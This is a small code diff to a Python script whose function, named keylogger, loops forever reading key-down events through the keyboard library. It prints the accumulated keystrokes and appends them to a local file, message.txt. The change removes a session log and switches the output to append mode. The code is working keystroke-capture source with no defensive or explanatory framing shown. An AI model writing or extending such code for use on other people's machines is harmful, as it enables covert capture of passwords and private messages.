@@ -4,15 +4,13 @@ import datetime
 
 
 def keylogger():
-    text = ''
-    with open("logs.txt", "a") as file:
-        file.write("Start session\n")
     while True:
+        text = ''
         event = keyboard.read_event()
         if event.event_type == "down":
             text += event.name
             print(text)
-            with open(f"message", "w") as file:
+            with open(f"message.txt", "a") as file:
                 file.write(text)
 
 
@@ -35,5 +33,7 @@ def on_key(event):
 keyboard.on_press(on_key)
 
 
+
 if __name__ == '__main__':
     keylogger()
+
